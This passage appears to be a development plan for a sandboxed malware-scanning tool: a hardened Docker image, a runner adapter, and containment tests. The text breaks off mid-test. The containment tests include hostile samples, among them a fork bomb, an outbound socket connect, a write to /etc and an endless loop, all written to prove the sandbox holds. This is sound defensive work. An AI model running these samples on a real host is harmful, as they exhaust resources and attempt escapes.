# Phase 3 — Extractor + Sandbox Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Reconstruct stored code — **exact** (byte-identical, manifest-driven, by reusing Phase-1's `Unpacker`) and **blind** (best-effort, confidence-labeled, for foreign models) — then run it in a hardened Docker sandbox and score it for maliciousness via layered static + dynamic analysis, emitting one unified `Report(kind="scan")`.

**Architecture:** Hexagonal/clean layering (see [SYSTEM-DESIGN.md](../SYSTEM-DESIGN.md) §5.5). This phase builds `engine/extract/` (Part 3a) and `engine/sandbox/` (Part 3b) plus the `docker/sandbox/` image. `SandboxRunner` is a **port** (Phase 0) so the substrate can swap; `DockerSandboxRunner` is the adapter (the only code that imports `docker`). Extraction **reuses** Phase-1 decode (no second decode path). Scanners self-register in `SCANNER_REGISTRY` (open/closed). Everything is TDD; security tests (containment) come before feature tests, per the spec's ordered steps.

**Tech Stack:** Python 3.10.x, uv; PyTorch (inference wrapper, already a dep from Phase 1); Docker + `docker` SDK (sandbox); Bandit, Semgrep, YARA (`yara-python`), regex secrets (static scanners); Hydra + OmegaConf (policy + calibration config); pydantic v2 (shared `Report`); numpy; pytest + Hypothesis; Docker-backed integration tests; import-linter (Dependency Rule). Reuses the Phase-0 kernel, the Phase-1 `Unpacker`/`TeacherForcedGreedy`/`DeltaVarintCodec`/corpus, and the Phase-2 `Report` model.

## Global Constraints

*Every task's requirements implicitly include this section. Values copied verbatim from the specs/ADRs.*

- **Python 3.10.x only.** `requires-python = ">=3.10,<3.11"`; `.python-version` = `3.10`. No 3.11+ syntax (`tomllib`, `except*`, `Self`, `type` statement). `match`, `X | Y` unions, PEP 585 generics are fine.
- **uv for everything.** Add deps with `uv add` / `uv add --dev`; never `pip install`; commit `uv.lock`. Run via `uv run`.
- **Quality on commit.** ruff (lint + format), mypy strict, import-linter run via pre-commit and CI.
- **Hydra owns all configuration.** Pydantic is for API wire schemas / manifest validation only. The sandbox policy and risk calibration come from `conf/engine/sandbox/docker.yaml`; blind heuristics from `conf/engine/extract/default.yaml`.
- **safetensors-first.** Loading pickle/`.bin` requires an explicit `allow_pickle=True` opt-in and raises `UnsafeModelError` otherwise.
- **Value objects cross module boundaries; bare `dict`s do not** (except opaque `evidence`/`context`/`config` payloads).
- **The Dependency Rule** (SYSTEM-DESIGN §1/§4): `engine.common` imports nothing else in `packer`; `engine.*` never imports `api`/`workers`; **only `engine.sandbox.adapters` may import `docker`** (the sanctioned adapter ring); enforced by import-linter.
- **Conventional Commits**, one logical change per commit.
- **Windows-native is the primary dev target;** use `pathlib`, never hardcode POSIX paths. The *host* engine is Windows-safe; Linux-only tooling (`strace`) lives **only inside the Docker image**.
- **Extracted code is hostile.** It is only ever executed inside the Docker sandbox with the full hardened policy (`--network=none`, `--read-only` + tmpfs, `--memory`/`--cpus`/`--pids-limit`, `--cap-drop=ALL`, `--security-opt=no-new-privileges`, non-root UID, wall-clock timeout). **Never run extracted code on the host, in a worker, or in the API process** (ADR-008).
- **Exact extraction is byte-identical** — guaranteed by reusing the Phase-1 residual-corrected decode, not by model quality. **Blind extraction is always labeled best-effort** (low/medium confidence, possibly partial); it never claims byte-exactness (ADR-007/§5.4).
- **Sandbox containment is a security gate.** The containment tests (net/fs/pid/time) are hard CI gates; a broken containment guarantee fails the build.
- **InferenceModel is the only place Part 3 runs inference** (forward-only wrapper). No inference anywhere in `engine.detect` (Part 2's wall is unaffected by this phase).

## File Structure

```
docker/sandbox/
  Dockerfile                 # pinned runtimes + strace, non-root user (the ONLY exec environment)
  .dockerignore
pyproject.toml               # + docker/bandit/semgrep/yara-python deps; importlinter layering + adapter ignore
conf/
  engine/sandbox/docker.yaml # hardened policy + risk calibration + enabled_scanners
  engine/extract/default.yaml# decode strategy/codec names + blind heuristics
src/packer/engine/sandbox/
  __init__.py
  policy.py                  # SandboxPolicy (frozen) + from_cfg
  runner.py                  # ExecUnit + SandboxResult value objects
  findings.py                # Finding
  fileset.py                 # FileSet.from_extraction + exec_units()
  analyzers.py               # StaticAnalyzer.scan + DynamicAnalyzer.analyze
  scorer.py                  # RiskScorer.score -> RiskReport (+ calibrate/evaluate)
  pipeline.py                # ScanPipeline.run -> Report(kind="scan")
  adapters/
    __init__.py
    docker.py                # DockerSandboxRunner (imports docker) — adapter ring
  static/
    __init__.py              # imports each scanner module (self-registration/discovery)
    ast_rules.py bandit_scan.py semgrep_scan.py yara_scan.py secrets.py
    resources/semgrep_dangerous.yml
    resources/malware.yar
src/packer/engine/extract/
  __init__.py                # imports exact+blind so EXTRACTOR_REGISTRY is populated
  model.py                   # Extraction + ExtractTarget value objects
  inference.py               # InferenceModel (forward-only; ONLY place inference runs)
  exact.py                   # ExactExtractor (reuses pack.Unpacker)
  blind.py                   # BlindExtractor
  service.py                 # ExtractionService.extract(target)
src/packer/engine/report/
  builders.py                # + ScanReportBuilder (Phase 2 supplies Report/VerdictBlock/ReportSection/ReportBuilder)
src/packer/engine/common/
  config_schema.py           # extend SandboxCfg (+RiskCfg) + add ExtractCfg; register groups
tests/
  unit/sandbox/{test_policy.py,test_findings.py,test_fileset.py,test_docker_runner.py,
                test_dynamic.py,test_static.py,test_scorer.py,test_pipeline.py}
  unit/sandbox/static/{test_ast_rules.py,test_bandit.py,test_semgrep.py,test_yara.py,test_secrets.py}
  unit/extract/{test_inference.py,test_exact.py,test_blind.py,test_service.py}
  integration/sandbox/{test_containment.py,test_scan_e2e.py}
  fixtures/                  # planted malicious + benign samples; a tiny Phase-1 .pak
```

---

### Task 1: The sandbox Docker image (pinned runtimes + strace, non-root)

**Files:**
- Create: `docker/sandbox/Dockerfile`, `docker/sandbox/.dockerignore`

**Interfaces:**
- Consumes: nothing (infrastructure).
- Produces: a `packer-sandbox:latest` image — the **only** environment extracted code may run in. Base pinned to `python:3.10.19-slim-bookworm`; `strace` installed for syscall capture; a non-root `sandbox` user (uid/gid 1000); `WORKDIR /scratch` (mounted `--tmpfs` at run time). No network is needed at run; the run policy (Task 3) enforces `--network=none`.

- [ ] **Step 1: Write the Dockerfile**

`docker/sandbox/Dockerfile`:
```dockerfile
# The ONLY environment extracted (hostile) code may run in (ADR-008).
# Base pinned by tag; pin by digest in CI/prod. strace enables the syscall trace (ADR-009).
FROM python:3.10.19-slim-bookworm

# strace from the pinned distro. ca-certificates deliberately NOT installed:
# the container runs with --network=none, so outbound TLS must be impossible anyway.
RUN apt-get update \
 && apt-get install -y --no-install-recommends strace \
 && rm -rf /var/lib/apt/lists/*

# Non-root user; extracted code never runs as root even before --user is re-applied at run.
RUN groupadd --gid 1000 sandbox \
 && useradd --uid 1000 --gid 1000 --no-create-home --shell /usr/sbin/nologin sandbox

# Root FS is mounted --read-only at run; /scratch is the only writable path (a small tmpfs).
WORKDIR /scratch
USER 1000:1000

# No phone-home entrypoint; the runner supplies argv per unit. This CMD is a liveness check.
CMD ["python3", "-c", "print('packer-sandbox ready')"]
```

`docker/sandbox/.dockerignore`:
```
*
!Dockerfile
```

- [ ] **Step 2: Build and verify (manual / CI image step — no unit test)**

Run:
```powershell
docker build -t packer-sandbox:latest docker/sandbox
docker run --rm --network=none --read-only --tmpfs /scratch packer-sandbox:latest `
  python3 -c "import os; print('uid', os.getuid()); print('ready')"
```
Expected: prints `uid 1000` and `ready` (proves non-root + read-only root + tmpfs writable). `strace` present: `docker run --rm packer-sandbox:latest strace -V` prints a version. Document any Docker Desktop settings needed on Windows (WSL2 backend optional; file sharing not required since units are streamed in via the SDK — Task 3).

- [ ] **Step 3: Commit**
```bash
git add docker/sandbox/Dockerfile docker/sandbox/.dockerignore
git commit -m "feat(sandbox): add hardened Docker image (pinned py3.10 + strace, non-root)"
```

---

### Task 2: Sandbox value objects — SandboxPolicy, SandboxResult, ExecUnit, Finding, FileSet

**Files:**
- Create: `src/packer/engine/sandbox/__init__.py`, `policy.py`, `runner.py`, `findings.py`, `fileset.py`
- Modify: `src/packer/engine/common/config_schema.py` (extend `SandboxCfg`, add `RiskCfg`), `conf/engine/sandbox/docker.yaml`
- Test: `tests/unit/sandbox/test_policy.py`, `test_findings.py`, `test_fileset.py`

**Interfaces:**
- Consumes: `SandboxCfg` (Phase 0 config_schema), `Extraction` (Task 10 — imported under `TYPE_CHECKING` only to avoid a cycle).
- Produces:
  - `SandboxPolicy` frozen dataclass with `.from_cfg(cfg) -> SandboxPolicy` (all hardened flags from Hydra: `network`, `read_only`, `memory`, `cpus`, `pids_limit`, `timeout_s`, `cap_drop`, `security_opt`, `user`, `tmpfs_dir`, `tmpfs_size`).
  - `SandboxResult{stdout, stderr, exit_code, timed_out, syscalls, fs_writes, net_attempts, duration_s}` (frozen).
  - `ExecUnit{filename, data, lang, argv}` (frozen).
  - `Finding{severity, rule, file, line, note}` (frozen) — the exact 5-field contract shared with the scorer + report (SYSTEM-DESIGN §3.1).
  - `FileSet` with `.from_extraction(extraction)` and `.exec_units() -> list[ExecUnit]` (language detection by suffix).

- [ ] **Step 1: Write the failing tests**

`tests/unit/sandbox/test_policy.py`:
```python
from packer.engine.common.config_schema import compose_config
from packer.engine.sandbox.policy import SandboxPolicy


def test_policy_from_cfg_pulls_hardened_flags():
    cfg = compose_config().engine.sandbox
    pol = SandboxPolicy.from_cfg(cfg)
    assert pol.network == "none"
    assert pol.read_only is True
    assert pol.cap_drop == ("ALL",)
    assert pol.pids_limit == 64
    assert pol.timeout_s == 20
    assert pol.user == "1000:1000"


def test_policy_is_frozen():
    pol = SandboxPolicy(image="packer-sandbox:latest")
    try:
        pol.network = "bridge"  # type: ignore[misc]
    except Exception as exc:  # FrozenInstanceError
        assert "cannot assign" in str(exc) or "frozen" in str(exc).lower()
    else:
        raise AssertionError("SandboxPolicy must be immutable")
```

`tests/unit/sandbox/test_findings.py`:
```python
from packer.engine.sandbox.findings import Finding


def test_finding_fields_and_frozen():
    f = Finding(severity="high", rule="ast.eval", file="a.py", line=3, note="eval() call")
    assert (f.severity, f.rule, f.file, f.line, f.note) == ("high", "ast.eval", "a.py", 3, "eval() call")
    try:
        f.severity = "low"  # type: ignore[misc]
    except Exception:
        pass
    else:
        raise AssertionError("Finding must be immutable")
```

`tests/unit/sandbox/test_fileset.py`:
```python
from packer.engine.sandbox.fileset import FileSet
from packer.engine.extract.model import Extraction


def test_fileset_exec_units_only_runnable_langs():
    ext = Extraction(
        files={"src/app.py": b"print(1)\n", "README.md": b"# hi\n"},
        confidence=1.0, confidence_class="exact",
    )
    fs = FileSet.from_extraction(ext)
    units = fs.exec_units()
    assert [u.filename for u in units] == ["src/app.py"]
    assert units[0].lang == "python"
    assert units[0].data == b"print(1)\n"
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `uv run pytest tests/unit/sandbox -v`
Expected: FAIL — modules missing. (`test_fileset` also needs `extract.model` from Task 10; if running Task 2 in isolation, stub `Extraction` or run this test after Task 10. Keep the import as written — it lands green once Task 10 exists.)

- [ ] **Step 3: Implement**

`src/packer/engine/sandbox/policy.py`:
```python
from __future__ import annotations

from dataclasses import dataclass
from typing import Any


@dataclass(frozen=True)
class SandboxPolicy:
    """Frozen, defense-in-depth run policy (ADR-008). Sourced from Hydra
    conf/engine/sandbox/docker.yaml; applied on EVERY sandbox run."""

    image: str
    network: str = "none"
    read_only: bool = True
    memory: str = "256m"
    cpus: float = 1.0
    pids_limit: int = 64
    timeout_s: int = 20
    cap_drop: tuple[str, ...] = ("ALL",)
    security_opt: tuple[str, ...] = ("no-new-privileges",)
    user: str = "1000:1000"
    tmpfs_dir: str = "/scratch"
    tmpfs_size: str = "16m"

    @classmethod
    def from_cfg(cls, cfg: Any) -> "SandboxPolicy":
        return cls(
            image=cfg.image,
            network=cfg.network,
            read_only=bool(cfg.read_only),
            memory=cfg.memory,
            cpus=float(cfg.cpus),
            pids_limit=int(cfg.pids_limit),
            timeout_s=int(cfg.timeout_s),
            cap_drop=tuple(cfg.cap_drop),
            security_opt=tuple(cfg.security_opt),
            user=str(cfg.user),
            tmpfs_dir=cfg.tmpfs_dir,
            tmpfs_size=cfg.tmpfs_size,
        )
```

`src/packer/engine/sandbox/runner.py`:
```python
from __future__ import annotations

from dataclasses import dataclass, field


@dataclass(frozen=True)
class ExecUnit:
    """One runnable file to execute in the sandbox."""

    filename: str
    data: bytes
    lang: str                       # "python" (image runtimes only; scope-limited, spec §1)
    argv: tuple[str, ...] = ()


@dataclass(frozen=True)
class SandboxResult:
    """Captured behavior of a single sandbox run (spec §2)."""

    stdout: str
    stderr: str
    exit_code: int | None           # None when killed (timeout / pids)
    timed_out: bool
    syscalls: tuple[str, ...] = field(default_factory=tuple)   # from strace -f
    fs_writes: tuple[str, ...] = field(default_factory=tuple)  # writes outside tmpfs
    net_attempts: tuple[str, ...] = field(default_factory=tuple)  # blocked connect() targets
    duration_s: float = 0.0
```

`src/packer/engine/sandbox/findings.py`:
```python
from __future__ import annotations

from dataclasses import dataclass

SEVERITIES = ("info", "low", "medium", "high", "critical")


@dataclass(frozen=True)
class Finding:
    """Immutable analysis finding (SYSTEM-DESIGN §3.1). Produced by scanners and
    the dynamic analyzer; consumed by the scorer and the report builder.
    Dynamic findings use a 'dynamic.*' rule prefix so provenance is explicit."""

    severity: str          # one of SEVERITIES
    rule: str
    file: str
    line: int
    note: str
```

`src/packer/engine/sandbox/fileset.py`:
```python
from __future__ import annotations

from dataclasses import dataclass
from pathlib import PurePosixPath
from typing import TYPE_CHECKING

from packer.engine.sandbox.runner import ExecUnit

if TYPE_CHECKING:
    from packer.engine.extract.model import Extraction

_LANG_BY_SUFFIX = {".py": "python"}


def _detect_lang(path: str) -> str | None:
    return _LANG_BY_SUFFIX.get(PurePosixPath(path).suffix)


@dataclass(frozen=True)
class FileSet:
    files: dict[str, bytes]

    @classmethod
    def from_extraction(cls, extraction: "Extraction") -> "FileSet":
        return cls(files=dict(extraction.files))

    def exec_units(self) -> list[ExecUnit]:
        units: list[ExecUnit] = []
        for path, data in self.files.items():
            lang = _detect_lang(path)
            if lang is not None:
                units.append(ExecUnit(filename=path, data=data, lang=lang))
        return units
```

Extend `src/packer/engine/common/config_schema.py` — replace the Phase-0 `SandboxCfg` with the full hardened schema and add risk calibration:
```python
from dataclasses import dataclass, field


@dataclass
class RiskCfg:
    # verdict thresholds on the normalized [0,1] risk score
    suspicious: float = 0.35
    malicious: float = 0.70
    # per-severity weights used by RiskScorer
    weight_info: float = 0.0
    weight_low: float = 0.2
    weight_medium: float = 0.5
    weight_high: float = 0.85
    weight_critical: float = 1.0


@dataclass
class SandboxCfg:
    image: str = "packer-sandbox:latest"
    network: str = "none"
    read_only: bool = True
    memory: str = "256m"
    cpus: float = 1.0
    pids_limit: int = 64
    timeout_s: int = 20
    cap_drop: list[str] = field(default_factory=lambda: ["ALL"])
    security_opt: list[str] = field(default_factory=lambda: ["no-new-privileges"])
    user: str = "1000:1000"
    tmpfs_dir: str = "/scratch"
    tmpfs_size: str = "16m"
    enabled_scanners: list[str] = field(
        default_factory=lambda: ["ast_rules", "bandit_scan", "semgrep_scan", "yara_scan", "secrets"]
    )
    risk: RiskCfg = field(default_factory=RiskCfg)


@dataclass
class ExtractCfg:
    decode: str = "teacher-forced-greedy"   # DECODE_REGISTRY name == manifest decode.strategy
    codec: str = "delta-varint-v1"           # CODEC_REGISTRY name == manifest residuals.codec
    blind_max_tokens: int = 4096
    blind_temperature: float = 0.0
    sandbox_runner: str = "docker"           # SANDBOX_REGISTRY name for assemble_ports
```
Register the new/updated groups in `register_configs()`:
```python
    cs.store(group="engine/sandbox", name="docker", node=SandboxCfg)   # replaces the Phase-0 stub
    cs.store(group="engine/extract", name="default", node=ExtractCfg)
```

`conf/engine/sandbox/docker.yaml`:
```yaml
image: packer-sandbox:latest
network: none
read_only: true
memory: 256m
cpus: 1.0
pids_limit: 64
timeout_s: 20
cap_drop: [ALL]
security_opt: [no-new-privileges]
user: "1000:1000"
tmpfs_dir: /scratch
tmpfs_size: 16m
enabled_scanners: [ast_rules, bandit_scan, semgrep_scan, yara_scan, secrets]
risk:
  suspicious: 0.35
  malicious: 0.70
  weight_info: 0.0
  weight_low: 0.2
  weight_medium: 0.5
  weight_high: 0.85
  weight_critical: 1.0
```

`conf/engine/extract/default.yaml`:
```yaml
decode: teacher-forced-greedy
codec: delta-varint-v1
blind_max_tokens: 4096
blind_temperature: 0.0
sandbox_runner: docker
```
Add `engine/extract: default` to the `defaults:` list in `conf/config.yaml`.

- [ ] **Step 4: Run tests to verify they pass**

Run: `uv run pytest tests/unit/sandbox/test_policy.py tests/unit/sandbox/test_findings.py -v && uv run mypy src`
Expected: PASS + mypy clean. (`test_fileset` goes green after Task 10.)

- [ ] **Step 5: Commit**
```bash
git add src/packer/engine/sandbox conf/engine/sandbox/docker.yaml conf/engine/extract/default.yaml \
        conf/config.yaml src/packer/engine/common/config_schema.py tests/unit/sandbox
git commit -m "feat(sandbox): add SandboxPolicy/SandboxResult/ExecUnit/Finding/FileSet + hardened config"
```

---

### Task 3: DockerSandboxRunner adapter (SANDBOX_REGISTRY, docker→SandboxError)

**Files:**
- Create: `src/packer/engine/sandbox/adapters/__init__.py`, `src/packer/engine/sandbox/adapters/docker.py`
- Modify: `pyproject.toml` (`uv add docker`; add the adapter-ring `ignore_imports` exception to the import-linter contract)
- Test: `tests/unit/sandbox/test_docker_runner.py`

**Interfaces:**
- Consumes: `SANDBOX_REGISTRY` (Phase 0), `SandboxRunner` port (Phase 0 `common.ports`), `SandboxError` (Phase 0 errors), `SandboxPolicy`/`ExecUnit`/`SandboxResult` (Task 2), `docker` SDK.
- Produces: `DockerSandboxRunner` implementing the `SandboxRunner` port, `@SANDBOX_REGISTRY.register("docker")`. It is the **only** module importing `docker`. It applies every hardened flag on each run, streams the unit into the tmpfs, captures stdout/stderr, pulls the `strace` trace back out, and derives `syscalls`/`fs_writes`/`net_attempts`. All `docker.errors.*` are wrapped into `SandboxError` at this boundary.

- [ ] **Step 1: Add the dependency + adapter-ring import exception**

Run: `uv add docker` (updates `pyproject.toml` + `uv.lock`).

Then edit the existing `[[tool.importlinter.contracts]]` named **"engine is framework-agnostic"** to permit exactly this one adapter→docker edge (the sanctioned adapter ring, SYSTEM-DESIGN §4):
```toml
[[tool.importlinter.contracts]]
name = "engine is framework-agnostic"
type = "forbidden"
source_modules = ["packer.engine"]
forbidden_modules = ["packer.api", "packer.workers", "docker", "redis", "sqlalchemy", "fastapi", "celery"]
ignore_imports = ["packer.engine.sandbox.adapters.docker -> docker"]
```

- [ ] **Step 2: Write the failing test**

`tests/unit/sandbox/test_docker_runner.py` (pure unit — a fake Docker client, no daemon; real containment is Task 4):
```python
import pytest
from packer.engine.common.errors import SandboxError
from packer.engine.common.registries import SANDBOX_REGISTRY
from packer.engine.sandbox.adapters.docker import DockerSandboxRunner
from packer.engine.sandbox.policy import SandboxPolicy
from packer.engine.sandbox.runner import ExecUnit


class _FakeContainer:
    def __init__(self, kwargs): self.kwargs = kwargs; self.removed = False
    def put_archive(self, path, data): return True
    def start(self): return None
    def wait(self, timeout=None): return {"StatusCode": 0}
    def logs(self, stdout=True, stderr=False): return b"hello\n" if stdout else b""
    def get_archive(self, path): raise KeyError("no trace")  # exercises graceful degrade
    def kill(self): return None
    def remove(self, force=False): self.removed = True


class _FakeContainers:
    def __init__(self): self.last = None
    def create(self, **kwargs):
        self.last = _FakeContainer(kwargs)
        return self.last


class _FakeClient:
    def __init__(self): self.containers = _FakeContainers()


def test_registered_under_docker():
    assert "docker" in SANDBOX_REGISTRY.names()


def test_run_applies_hardened_flags():
    client = _FakeClient()
    runner = DockerSandboxRunner(client=client)
    pol = SandboxPolicy(image="packer-sandbox:latest")
    res = runner.run(ExecUnit(filename="a.py", data=b"print('hello')", lang="python"), pol)
    kw = client.containers.last.kwargs
    assert kw["network_mode"] == "none"
    assert kw["read_only"] is True
    assert kw["cap_drop"] == ["ALL"]
    assert kw["pids_limit"] == 64
    assert kw["user"] == "1000:1000"
    assert kw["mem_limit"] == "256m"
    assert "/scratch" in kw["tmpfs"]
    assert res.exit_code == 0 and res.timed_out is False
    assert "hello" in res.stdout


def test_docker_errors_become_sandbox_error():
    import docker.errors as de

    class _Boom(_FakeContainers):
        def create(self, **kwargs): raise de.APIError("daemon exploded")

    client = _FakeClient(); client.containers = _Boom()
    with pytest.raises(SandboxError):
        DockerSandboxRunner(client=client).run(
            ExecUnit(filename="a.py", data=b"x", lang="python"), SandboxPolicy(image="i")
        )
```

- [ ] **Step 3: Run test to verify it fails**

Run: `uv run pytest tests/unit/sandbox/test_docker_runner.py -v`
Expected: FAIL — module missing.

- [ ] **Step 4: Implement**

`src/packer/engine/sandbox/adapters/__init__.py`: empty.

`src/packer/engine/sandbox/adapters/docker.py`:
```python
from __future__ import annotations

import io
import tarfile
import time
from typing import Any

import docker
from docker.errors import APIError, DockerException, ImageNotFound

from packer.engine.common.errors import SandboxError
from packer.engine.common.registries import SANDBOX_REGISTRY
from packer.engine.sandbox.policy import SandboxPolicy
from packer.engine.sandbox.runner import ExecUnit, SandboxResult

_TRACE = "trace.log"
_LANG_CMD = {"python": ["python3"]}
_NET_SYSCALLS = ("connect", "socket", "sendto", "sendmsg", "bind", "getaddrinfo")


@SANDBOX_REGISTRY.register("docker")
class DockerSandboxRunner:
    """SandboxRunner adapter (ADR-008). The ONLY code that talks to the Docker
    daemon; wraps every docker.errors.* into SandboxError at this boundary."""

    def __init__(self, client: Any | None = None) -> None:
        if client is not None:
            self._client = client
            return
        try:
            self._client = docker.from_env()
        except DockerException as exc:
            raise SandboxError("docker daemon unavailable", context={"cause": str(exc)}) from exc

    def run(self, unit: ExecUnit, policy: SandboxPolicy) -> SandboxResult:
        interp = _LANG_CMD.get(unit.lang)
        if interp is None:
            raise SandboxError(f"unsupported sandbox lang: {unit.lang}", context={"lang": unit.lang})
        target = f"{policy.tmpfs_dir}/{unit.filename.replace('/', '_')}"
        command = ["strace", "-f", "-qq", "-o", f"{policy.tmpfs_dir}/{_TRACE}", *interp, target, *unit.argv]
        started = time.monotonic()
        container = None
        try:
            container = self._client.containers.create(
                image=policy.image,
                command=command,
                network_mode=policy.network,                 # "none"
                read_only=policy.read_only,                  # --read-only
                mem_limit=policy.memory,
                nano_cpus=int(policy.cpus * 1_000_000_000),
                pids_limit=policy.pids_limit,
                cap_drop=list(policy.cap_drop),              # ["ALL"]
                security_opt=[f"{opt}:true" if "=" not in opt and ":" not in opt else opt
                              for opt in policy.security_opt],  # no-new-privileges:true
                user=policy.user,                            # non-root uid:gid
                tmpfs={policy.tmpfs_dir: f"size={policy.tmpfs_size}"},
                working_dir=policy.tmpfs_dir,
                detach=True,
            )
            container.put_archive(policy.tmpfs_dir, _tar_bytes(target.rsplit("/", 1)[1], unit.data))
            container.start()
            timed_out = False
            exit_code: int | None
            try:
                exit_code = int(container.wait(timeout=policy.timeout_s).get("StatusCode", -1))
            except Exception:  # docker-py raises ReadTimeout on wall-clock timeout
                timed_out = True
                exit_code = None
                try:
                    container.kill()
                except DockerException:
                    pass
            stdout = container.logs(stdout=True, stderr=False).decode("utf-8", "replace")
            stderr = container.logs(stdout=False, stderr=True).decode("utf-8", "replace")
            syscalls, fs_writes, net_attempts = _parse_trace(container, policy)
            return SandboxResult(
                stdout=stdout, stderr=stderr, exit_code=exit_code, timed_out=timed_out,
                syscalls=syscalls, fs_writes=fs_writes, net_attempts=net_attempts,
                duration_s=time.monotonic() - started,
            )
        except (APIError, ImageNotFound, DockerException) as exc:
            raise SandboxError(
                "sandbox run failed", context={"image": policy.image, "cause": str(exc)}
            ) from exc
        finally:
            if container is not None:
                try:
                    container.remove(force=True)
                except DockerException:
                    pass


def _tar_bytes(name: str, data: bytes) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tar:
        info = tarfile.TarInfo(name=name)
        info.size = len(data)
        tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _parse_trace(container: Any, policy: SandboxPolicy) -> tuple[tuple[str, ...], tuple[str, ...], tuple[str, ...]]:
    """Pull the strace log back out of the tmpfs and classify it. Degrades to
    empty tuples if the trace is unavailable (spec §7: reduced fidelity, still safe)."""
    try:
        stream, _ = container.get_archive(f"{policy.tmpfs_dir}/{_TRACE}")
        raw = _read_single_file_tar(b"".join(stream))
    except Exception:
        return ((), (), ())
    syscalls: list[str] = []
    fs_writes: list[str] = []
    net_attempts: list[str] = []
    for line in raw.decode("utf-8", "replace").splitlines():
        name = _syscall_name(line)
        if name is None:
            continue
        syscalls.append(name)
        if name in _NET_SYSCALLS and "AF_INET" in line:
            net_attempts.append(line.strip()[:200])
        if name in ("openat", "open") and ("O_WRONLY" in line or "O_CREAT" in line or "O_RDWR" in line):
            if policy.tmpfs_dir not in line:
                fs_writes.append(line.strip()[:200])
    return (tuple(syscalls), tuple(fs_writes), tuple(net_attempts))


def _read_single_file_tar(blob: bytes) -> bytes:
    with tarfile.open(fileobj=io.BytesIO(blob), mode="r") as tar:
        member = tar.getmembers()[0]
        fh = tar.extractfile(member)
        return fh.read() if fh is not None else b""


def _syscall_name(line: str) -> str | None:
    body = line.split("] ", 1)[-1] if "] " in line else line  # drop the "[pid  N]" prefix
    head = body.strip().split("(", 1)[0].strip()
    return head if head.isidentifier() else None
```

- [ ] **Step 5: Run test + import-linter**

Run: `uv run pytest tests/unit/sandbox/test_docker_runner.py -v && uv run lint-imports && uv run mypy src`
Expected: PASS; contracts kept (the adapter→docker edge is now the sole ignored import); mypy clean.

- [ ] **Step 6: Commit**
```bash
git add pyproject.toml uv.lock src/packer/engine/sandbox/adapters tests/unit/sandbox/test_docker_runner.py
git commit -m "feat(sandbox): DockerSandboxRunner adapter with hardened policy + docker→SandboxError wrapping"
```

---

### Task 4: Containment integration tests (security gate — net/fs/pid/time)

**Files:**
- Create: `tests/integration/sandbox/__init__.py`, `tests/integration/sandbox/test_containment.py`

**Interfaces:**
- Consumes: `DockerSandboxRunner` (Task 3), `SandboxPolicy`/`ExecUnit` (Task 2), `compose_config` (Phase 0), the built `packer-sandbox:latest` image (Task 1).
- Produces: the **security gate** (spec §4, ADR-008). Marked `integration` (needs Docker + the image). Each test is an adversarial fixture whose escape must fail and be recorded.

- [ ] **Step 1: Write the containment tests**

`tests/integration/sandbox/test_containment.py`:
```python
import pytest
from packer.engine.common.config_schema import compose_config
from packer.engine.sandbox.adapters.docker import DockerSandboxRunner
from packer.engine.sandbox.policy import SandboxPolicy
from packer.engine.sandbox.runner import ExecUnit

pytestmark = pytest.mark.integration


def _policy() -> SandboxPolicy:
    return SandboxPolicy.from_cfg(compose_config().engine.sandbox)


def _run(src: bytes) -> "object":
    return DockerSandboxRunner().run(ExecUnit(filename="unit.py", data=src, lang="python"), _policy())


def test_network_is_blocked_and_recorded():
    src = b"import socket\n" \
          b"s = socket.socket()\n" \
          b"try:\n" \
          b"    s.connect(('1.1.1.1', 53))\n" \
          b"    print('CONNECTED')\n" \
          b"except OSError as e:\n" \
          b"    print('BLOCKED', e)\n"
    res = _run(src)
    assert "CONNECTED" not in res.stdout            # network must be unreachable
    assert res.net_attempts or "BLOCKED" in res.stdout  # attempt recorded (trace or observable error)


def test_write_outside_tmpfs_fails():
    src = b"open('/etc/packer_escape', 'w').write('x')\n"
    res = _run(src)
    assert res.exit_code not in (0,)                # read-only root => write raises
    assert all("/scratch" not in w or "/etc/" in w for w in res.fs_writes) or res.fs_writes == ()


def test_fork_bomb_hits_pids_limit():
    src = b"import os\n" \
          b"while True:\n" \
          b"    try:\n" \
          b"        os.fork()\n" \
          b"    except OSError:\n" \
          b"        break\n" \
          b"print('SURVIVED')\n"
    res = _run(src)
    # pids-limit stops unbounded forking; the host is unaffected and the run ends.
    assert res.timed_out or res.exit_code is not None


def test_infinite_loop_hits_timeout():
    res = _run(b"while True:\n    pass\n")
    assert res.timed_out is True
    assert res.duration_s <= _policy().timeout_s + 10
```

- [ ] **Step 2: Run (requires Docker + built image)**

Run:
```powershell
docker build -t packer-sandbox:latest docker/sandbox
uv run pytest tests/integration/sandbox/test_containment.py -m integration -v
```
Expected: all PASS — network blocked+recorded, out-of-tmpfs write fails, fork-bomb contained, infinite loop times out. If any fails, **stop** — containment is a hard gate; fix the policy/adapter before proceeding.

- [ ] **Step 3: Commit**
```bash
git add tests/integration/sandbox
git commit -m "test(sandbox): containment security gate (net/fs/pid/time escapes must fail)"
```

---

### Task 5: DynamicAnalyzer — SandboxResult → Findings

**Files:**
- Create: `src/packer/engine/sandbox/analyzers.py` (DynamicAnalyzer now; StaticAnalyzer added in Task 9)
- Test: `tests/unit/sandbox/test_dynamic.py`

**Interfaces:**
- Consumes: `SandboxRunner` port (Phase 0), `SandboxPolicy`/`ExecUnit`/`SandboxResult`/`Finding` (Task 2).
- Produces: `DynamicAnalyzer.analyze(unit, sandbox, policy) -> list[Finding]` — runs the unit through the injected sandbox port and maps behaviors (blocked network, out-of-tmpfs writes, timeout, suspicious syscalls) to `Finding`s with `dynamic.*` rules. Pure logic; unit-tested with a `FakeSandboxRunner` (no Docker).

- [ ] **Step 1: Write the failing test**

`tests/unit/sandbox/test_dynamic.py`:
```python
from packer.engine.sandbox.analyzers import DynamicAnalyzer
from packer.engine.sandbox.policy import SandboxPolicy
from packer.engine.sandbox.runner import ExecUnit, SandboxResult


class _FakeSandbox:
    def __init__(self, result): self._result = result; self.calls = 0
    def run(self, unit, policy): self.calls += 1; return self._result


def test_dynamic_flags_network_and_timeout():
    result = SandboxResult(
        stdout="", stderr="", exit_code=None, timed_out=True,
        syscalls=("execve", "ptrace"), fs_writes=("openat(/etc/x, O_WRONLY)",),
